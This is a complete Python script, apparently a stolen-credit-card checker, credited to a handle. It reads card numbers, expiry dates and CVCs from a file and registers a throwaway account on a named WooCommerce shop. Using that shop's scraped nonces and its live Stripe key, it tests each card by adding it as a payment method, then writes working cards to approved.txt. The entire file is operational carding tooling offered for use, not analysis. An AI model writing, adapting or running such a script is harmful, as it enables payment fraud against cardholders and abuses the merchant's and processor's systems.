import subprocess, sys, os, re, time, random, string
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

AUTHOR = "@wortexbabax"
BASE = "https://lachio.bg"
STRIPE_KEY = "pk_live_51RwOhgRXJYeffe5ZMJ2T8l4GJ7chCWC26T1AwzfQl8ppReArnVJSsnDd4VCawUpQMXlVvTLVsitdm1VDZUD1CEjF00B7snlvgi"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"

def main():
    if not os.path.exists("cc.txt"): print("[!] cc.txt not found"); sys.exit(1)
    with open("cc.txt") as f: cards = [l.strip() for l in f if l.strip()]

    s = requests.Session()
    rand = "".join(random.choices(string.ascii_lowercase+string.digits, k=8))
    email = f"{rand}@gmail.com"


    r1 = s.get(f"{BASE}/my-account/")
    m = re.search(r'woocommerce-register-nonce" value="([^"]+)"', r1.text)
    if not m: print("[!] nonce"); sys.exit(1)
    reg_nonce = m.group(1)


    s.cookies.clear()
    r2 = s.post(f"{BASE}/my-account/", data={
        "email": email, "password": email,
        "woocommerce-register-nonce": reg_nonce,
        "_wp_http_referer": "/my-account/",
        "register": "Регистриране",
    })

    if "wordpress_logged_in" not in str(s.cookies):
        print("[!] register failed"); sys.exit(1)

    r3 = s.get(f"{BASE}/my-account/add-payment-method/", headers={"referer": f"{BASE}/my-account/"})


    an = None
    m = re.search(r'createAndConfirmSetupIntentNonce[^:]*:\s*"([^"]+)"', r3.text)
    if m: an = m.group(1)
    if not an:
        m = re.search(r'"_ajax_nonce":"([^"]+)"', r3.text)
        if m: an = m.group(1)
    if not an:
        print("[!] ajax nonce"); sys.exit(1)

    approved, declined = [], []
    for card in cards:
        p = card.split("|")
        if len(p) < 4: continue
        ccn, mes, ano, cvc = p[0].strip(), p[1].strip(), p[2].strip(), p[3].strip()
        if len(ano) == 4: ano2 = ano[-2:]
        else: ano2 = ano

        pm_data = {
            "type": "card", "card[number]": ccn.replace(" ", ""), "card[cvc]": cvc,
            "card[exp_year]": ano2, "card[exp_month]": mes.zfill(2),
            "allow_redisplay": "unspecified", "billing_details[address][country]": "TR",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/299e1ea907; stripe-js-v3/299e1ea907; payment-element; deferred-intent",
            "referrer": "https://lachio.bg", "time_on_page": "88921",
            "key": STRIPE_KEY, "_stripe_version": "2024-06-20",
        }
        pm = None
        err = ""
        try:
            resp = requests.post("https://api.stripe.com/v1/payment_methods",
                headers={"accept": "application/json", "content-type": "application/x-www-form-urlencoded",
                         "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", "user-agent": UA},
                data=pm_data, timeout=30)
            j = resp.json()
            if j.get("id","").startswith("pm_"): pm = j["id"]
            else:
                err = j.get("error",{}).get("message","") or resp.text[:200]
        except Exception as e: err = str(e)

        if not pm:
            l = f"{ccn}|{mes}|{ano}|{cvc} {err}"
            declined.append(l); print(l); continue

        try:
            ra = s.post(f"{BASE}/wp-admin/admin-ajax.php",
                headers={"x-requested-with": "XMLHttpRequest", "origin": BASE,
                         "referer": f"{BASE}/my-account/add-payment-method/", "user-agent": UA},
                data={"action": "wc_stripe_create_and_confirm_setup_intent",
                      "wc-stripe-payment-method": pm, "wc-stripe-payment-type": "card",
                      "_ajax_nonce": an}, timeout=30)
            j = ra.json()
            if j.get("success") is True:
                l = f"{ccn}|{mes}|{ano}|{cvc} Card Added"; approved.append(l)
            else:
                msg = j.get("data",{}).get("error",{}).get("message","") or "Declined"
                l = f"{ccn}|{mes}|{ano}|{cvc} {msg}"; declined.append(l)
        except Exception as e:
            l = f"{ccn}|{mes}|{ano}|{cvc} {e}"; declined.append(l)
        print(l)
        time.sleep(1)

    with open("approved.txt","w") as f: f.write("\n".join(approved)+"\n" if approved else "")
    with open("declined.txt","w") as f: f.write("\n".join(declined)+"\n" if declined else "")

if __name__ == "__main__":
    main()
